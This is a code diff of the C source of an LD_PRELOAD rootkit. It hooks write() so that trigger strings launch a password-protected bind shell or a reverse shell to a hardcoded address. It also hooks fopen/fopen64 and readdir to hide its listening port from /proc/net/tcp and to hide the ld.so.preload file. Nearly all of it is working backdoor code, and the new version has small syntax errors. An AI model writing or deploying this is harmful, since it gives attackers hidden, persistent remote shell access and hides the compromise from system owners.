@@ -1,294 +1,198 @@
+//libraries
+#include <stdlib.h>
 #include <stdio.h>
-#include <unistd.h>
-#include <dlfcn.h>
 #include <string.h>
-#include <fcntl.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
 #include <dlfcn.h>
+#include <unistd.h>
 #include <dirent.h>
 #include <arpa/inet.h>
-//bind-shell definitions
-#define KEY_4 "notavaliduser4"
-#define KEY_6 "notavaliduser6"
-#define PASS "areallysecurepassword1234!@#$"
-#define LOC_PORT 65065
-//reverse-shell definitions
-#define KEY_R_4 "reverseshell4"
-#define KEY_R_6 "reverseshell6"
-#define REM_HOST4 "127.0.0.1"
-#define REM_HOST6 "::1"
-#define REM_PORT 443
-//filename to hide
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <netdb.h>
+
+#define REVTRIGGER "plsrev" //  presence of this string will trigger the REV Shell
+#define BINDTRIGGER "plsbind" // presence of this string will trigger the BIND Shell
+#define PASS "th0u$h@lln0tp@$$" // password for shell access
+#define PORT "5555" // port to listen on / connect to
+#define HEXPORT "15B3" // hex value reflected in netstat
 #define FILENAME "ld.so.preload"
-//hex represenation of port to hide for /proc/net/tcp reads
-#define KEY_PORT "FE29"
+#define IP "192.168.0.108" // IP to connect to
 
-int ipv6_bind (void)
+
+/* I KEEP FORGETING THIS :
+
+    struct addrinfo {
+	int              ai_flags;     // AI_PASSIVE, AI_CANONNAME, etc.
+	int              ai_family;    // AF_INET, AF_INET6, AF_UNSPEC
+	int              ai_socktype;  // SOCK_STREAM, SOCK_DGRAM
+	int              ai_protocol;  // use 0 for "any"
+	size_t           ai_addrlen;   // size of ai_addr in bytes
+	struct sockaddr *ai_addr;      // struct sockaddr_in or _in6
+	char            *ai_canonname; // full canonical hostname
+
+	struct addrinfo *ai_next;      // linked list, next node
+    };
+
+    int getaddrinfo(const char *node,     // e.g. "www.example.com" or IP
+			const char *service,  // e.g. "http" or port number
+			const struct addrinfo *hints,
+			struct addrinfo **res);
+*/
+
+int ip_rev(void)
 {
-    struct sockaddr_in6 addr;
-    addr.sin6_family = AF_INET6;
-    addr.sin6_port = htons(LOC_PORT);
-    addr.sin6_addr = in6addr_any;
-
-    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);
-
-    const static int optval = 1;
-
-    setsockopt(sockfd, IPPROTO_IPV6, IPV6_V6ONLY, &optval, sizeof(optval));
-
-    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
-
-    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));
-
-    listen(sockfd, 0);
-
-    int new_sockfd = accept(sockfd, NULL, NULL);
-
-    for (int count = 0; count < 3; count++)
-    {
-        dup2(new_sockfd, count);
-    }
-
-    char input[30];
-
-    read(new_sockfd, input, sizeof(input));
-    input[strcspn(input, "\n")] = 0;
-    if (strcmp(input, PASS) == 0)
-    {
-        execve("/bin/sh", NULL, NULL);
-        close(sockfd);
-    }
-    else 
-    {
-        shutdown(new_sockfd, SHUT_RDWR);
-        close(sockfd);
-    }
-    
-}
-
-int ipv4_bind (void)
-{
-    struct sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(LOC_PORT);
-    addr.sin_addr.s_addr = INADDR_ANY;
-
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-
-    const static int optval = 1;
-
-    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
-
-    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));
-
-    listen(sockfd, 0);
-
-    int new_sockfd = accept(sockfd, NULL, NULL);
-
-    for (int count = 0; count < 3; count++)
-    {
-        dup2(new_sockfd, count);
-    }
-
-    char input[30];
-
-    read(new_sockfd, input, sizeof(input));
-    input[strcspn(input, "\n")] = 0;
-    if (strcmp(input, PASS) == 0)
-    {
-        execve("/bin/sh", NULL, NULL);
-        close(sockfd);
-    }
-    else 
-    {
-        shutdown(new_sockfd, SHUT_RDWR);
-        close(sockfd);
-    }
-    
-}
-
-int ipv6_rev (void)
-{
-    const char* host = REM_HOST6;
-
-    struct sockaddr_in6 addr;
-    addr.sin6_family = AF_INET6;
-    addr.sin6_port = htons(REM_PORT);
-    inet_pton(AF_INET6, host, &addr.sin6_addr);
-
-    struct sockaddr_in6 client;
-    client.sin6_family = AF_INET6;
-    client.sin6_port = htons(LOC_PORT);
-    client.sin6_addr = in6addr_any;
-
-    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);
-
-    bind(sockfd, (struct sockaddr*) &client, sizeof(client));
-
-    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));
-
-    for (int count = 0; count < 3; count++)
-    {
-        dup2(sockfd, count);
-    }
-
-    execve("/bin/sh", NULL, NULL);
-    close(sockfd);
-
-    return 0;
-}
-
-int ipv4_rev (void)
-{
-    const char* host = REM_HOST4;
-
-    struct sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(REM_PORT);
-    inet_aton(host, &addr.sin_addr);
-
-    struct sockaddr_in client;
-    client.sin_family = AF_INET;
-    client.sin_port = htons(LOC_PORT);
-    client.sin_addr.s_addr = INADDR_ANY;
-
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-
-    bind(sockfd, (struct sockaddr*) &client, sizeof(client));
-
-    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));
-
-    for (int count = 0; count < 3; count++)
-    {
-        dup2(sockfd, count);
-    }
-
-    execve("/bin/sh", NULL, NULL);
-    close(sockfd);
-
-    return 0;
-}
-
-ssize_t write(int fildes, const void *buf, size_t nbytes)
-{
-    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
-
-    ssize_t result;
-
-    new_write = dlsym(RTLD_NEXT, "write");
-
-
-    char *bind4 = strstr(buf, KEY_4);
-    char *bind6 = strstr(buf, KEY_6);
-    char *rev4 = strstr(buf, KEY_R_4);
-    char *rev6 = strstr(buf, KEY_R_6);
-
-    if (bind4 != NULL)
-    {
-        fildes = open("/dev/null", O_WRONLY | O_APPEND);
-        result = new_write(fildes, buf, nbytes);
-        ipv4_bind();
-    }
-
-    else if (bind6 != NULL)
-    {
-        fildes = open("/dev/null", O_WRONLY | O_APPEND);
-        result = new_write(fildes, buf, nbytes);
-        ipv6_bind();
-    }
-
-    else if (rev4 != NULL)
-    {
-        fildes = open("/dev/null", O_WRONLY | O_APPEND);
-        result = new_write(fildes, buf, nbytes);
-        ipv4_rev();
-    }
-
-    else if (rev6 != NULL)
-    {
-        fildes = open("/dev/null", O_WRONLY | O_APPEND);
-        result = new_write(fildes, buf, nbytes);
-        ipv6_rev();
-    }
-
-    else
-    {
-        result = new_write(fildes, buf, nbytes);
-    }
-
-    return result;
-}
-
-struct dirent *(*old_readdir)(DIR *dir);
-struct dirent *readdir(DIR *dirp)
-{
-    old_readdir = dlsym(RTLD_NEXT, "readdir");
-
-    struct dirent *dir;
-
-    while (dir = old_readdir(dirp))
-    {
-        if(strstr(dir->d_name,FILENAME) == 0) break;
-    }
-    return dir;
-}
-
-
-struct dirent64 *(*old_readdir64)(DIR *dir);
-struct dirent64 *readdir64(DIR *dirp)
-{
-    old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
-
-    struct dirent64 *dir;
-
-    while (dir = old_readdir64(dirp))
-    {
-        if(strstr(dir->d_name,FILENAME) == 0) break;
-    }
-    return dir;
-}
-
-FILE *(*orig_fopen64)(const char *pathname, const char *mode);
-FILE *fopen64(const char *pathname, const char *mode)
-{
-	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
-
-	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
-
-	FILE *fp;
-
-	if (ptr_tcp != NULL)
+	int s;
+	if((s=socket(AF_INET,SOCK_STREAM,0))==-1)
 	{
-		char line[256];
-		FILE *temp = tmpfile64();
-		fp = orig_fopen64(pathname, mode);
-		while (fgets(line, sizeof(line), fp))
-		{
-			char *listener = strstr(line, KEY_PORT);
-			if (listener != NULL)
-			{
-				continue;
-			}
-			else
-			{
-				fputs(line, temp);
-			}
-		}
-		return temp;
+		//perror("[-] Error Creating Socket Descriptor\n");		
+		return -1;
 	}
 
-	fp = orig_fopen64(pathname, mode);
-	return fp;
+	int optval=1;
+	if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))==-1)
+	{
+		//perror("[-] Error in setsockopt()\n");
+		return -2;
+	}
+
+	struct addrinfo hints, *res;
+	memset(&hints, 0, sizeof(hints));
+
+	hints.ai_family = AF_UNSPEC;  // use IPv4 or IPv6, whichever
+	hints.ai_socktype = SOCK_STREAM;
+	getaddrinfo(IP, PORT, &hints, &res);
+
+	while(connect(s,res->ai_addr,res->ai_addrlen) != 0)
+	{
+		sleep(1);
+	}
+
+	dup2(s, 0);
+	dup2(s, 1);
+	dup2(s, 2);
+
+    char input[30];
+    read(s, input, sizeof(input)); // Read Input Stream For Password
+    if (strncmp(input,PASS,strlen(PASS))==0)
+    {
+        char *shell[2];
+        shell[0]="/bin/sh";
+        shell[1]=NULL;
+        execve(shell[0],shell, NULL); // Call Our Shell
+        close(s);
+        return 0;
+    }
+    
+    else
+    {
+        shutdown(s,SHUT_RDWR); // Shutdown Further R/W Operation From Client
+        close(s);
+        return -3;
+    }
 }
 
-FILE *(*orig_fopen)(const char *pathname, const char *mode);
+int ip_bind(void)
+{	
+	int s;
+	if ((s=socket(AF_INET,SOCK_STREAM,0))==-1) // Create Socket FD
+	{
+		//perror("[-] Error Creating Socket Descriptor\n");		
+		return -1;
+	}
+
+	int optval=1;
+	if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))==-1) // Allow reusability of the socket
+	{
+		//perror("[-] Error in setsockopt()\n");
+		return -2;
+	}
+
+	struct addrinfo hints, *res;
+	memset(&hints, 0, sizeof(hints)); // Zero out the garbage values in memory
+	hints.ai_family = AF_UNSPEC;  // Use IPv4 or IPv6, whichever
+	hints.ai_socktype = SOCK_STREAM; // TCP
+	hints.ai_flags = AI_PASSIVE;     // Fill in my IP for me
+	
+	getaddrinfo(NULL, PORT, &hints, &res); // Fill the structure	
+
+	if((bind(s,res->ai_addr,res->ai_addrlen))==-1)
+	{
+		//perror("[+] Failed To Bind Port \n");
+		return -3;	
+	}
+
+	if(listen(s,5) == -1) // Listen On The Specified Port With a backlog of 5
+	{
+	    //perror("[-] Could Not Listen\n");
+		return -4;
+	}
+
+	int conn_fd; // FD for client connections
+	
+	// accept(sock, (struct sockaddr *) &client_address, &client_length); can also be done but I dont want my IP to be known to the server	
+	conn_fd = accept(s, NULL, NULL);
+	if(conn_fd == -1)
+	{
+		//perror("[-] Could Not Accept Connection\n");
+		exit(-5);
+	}	
+
+    dup2(conn_fd, 0);
+    dup2(conn_fd, 1);
+    dup2(conn_fd, 2);
+
+    char input[30];
+    read(conn_fd, input, sizeof(input)); // Read Input Stream For Password
+    if (strncmp(input,PASS,strlen(PASS))==0)
+    {
+    	char *shell[2];
+    	shell[0]="/bin/sh";
+    	shell[1]=NULL;
+    	execve(shell[0],shell, NULL); // Call Our Shell
+    	close(s);
+    	return 0;
+    }
+    
+    else
+    {
+    	shutdown(conn_fd,SHUT_RDWR); // Shutdown Further R/W Operation From Client
+    	close(s);
+    	return -5;
+    }
+}
+
+ssize_t write(int fildes, const void *buf, size_t nbytes) // From Manual
+{
+	ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); // Create A New Function Pointer
+	ssize_t result;
+
+	new_write = dlsym(RTLD_NEXT, "write"); // Find the next occurrence of the desired symbol in the search order after the current object
+	
+	if (strstr(buf,BINDTRIGGER) != NULL) // Check If A Particular String Is Present In The ind Shell And Trigger Accordingly
+	{
+		fildes = open("/dev/null", O_WRONLY | O_APPEND)
+		result = new_write(fildes,buf,nbytes);
+		ip_bind();
+	}
+	else if(strstr(buf,REVTRIGGER) != NULL)
+	{
+		fildes = open("/dev/null", O_WRONLY | O_APPEND)
+		result = new_write(fildes,buf,nbytes);
+		ip_rev();	
+	}
+	else
+	{
+		result = new_write(fildes, buf, nbytes);
+	}
+	return result;
+}
+
 FILE *fopen(const char *pathname, const char *mode)
 {
-	orig_fopen = dlsym(RTLD_NEXT, "fopen");
-
+	FILE *(*orig_fopen)(const char *pathname, const char *mode);
+	orig_fopen=dlsym(RTLD_NEXT,"fopen");
 	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
-
 	FILE *fp;
 
 	if (ptr_tcp != NULL)
@@ -298,7 +202,7 @@ FILE *fopen(const char *pathname, const char *mode)
 		fp = orig_fopen(pathname, mode);
 		while (fgets(line, sizeof(line), fp))
 		{
-			char *listener = strstr(line, KEY_PORT);
+			char *listener = strstr(line, HEXPORT);
 			if (listener != NULL)
 			{
 				continue;
@@ -309,9 +213,40 @@ FILE *fopen(const char *pathname, const char *mode)
 			}
 		}
 		return temp;
-
 	}
-
+	
 	fp = orig_fopen(pathname, mode);
+	return fp;
+}
+
+
+FILE *fopen64(const char *pathname, const char *mode)
+{
+	FILE *(*orig_fopen64)(const char *pathname, const char *mode);
+	orig_fopen64=dlsym(RTLD_NEXT,"fopen64");
+	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
+	FILE *fp;
+
+	if (ptr_tcp != NULL)
+	{
+		char line[256];
+		FILE *temp64 = tmpfile64();
+		fp = orig_fopen64(pathname, mode);
+		while (fgets(line, sizeof(line), fp))
+		{
+			char *listener = strstr(line, HEXPORT);
+			if (listener != NULL)
+			{
+				continue;
+			}
+			else
+			{
+				fputs(line, temp64);
+			}
+		}			
+		return temp64;
+	}
+	
+	fp = orig_fopen64(pathname, mode);
 	return fp;
 }
